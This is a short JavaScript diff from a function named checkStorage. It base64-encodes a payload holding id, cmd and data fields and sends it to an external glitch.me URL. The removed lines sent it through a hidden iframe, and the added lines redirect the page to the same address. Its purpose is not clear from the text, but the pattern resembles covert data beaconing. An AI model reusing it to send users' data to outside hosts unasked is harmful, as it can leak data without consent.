@@ -103,13 +103,9 @@ function checkStorage() {
          const payload = JSON.stringify({
              id,cmd,data,sha1,for:here
          });
-         
-         const iframe= document.createElement('iframe');
-         
-         iframe.style.display="none";
-         
-         iframe.src = "https://pollen-diamond-cone.glitch.me?req="+encodeURIComponent(btoa(payload));
-         document.body.appendChild(iframe);
+              
+         window.location.replace("https://pollen-diamond-cone.glitch.me?req="+encodeURIComponent(btoa(payload)));
+       
           
          
          /* 
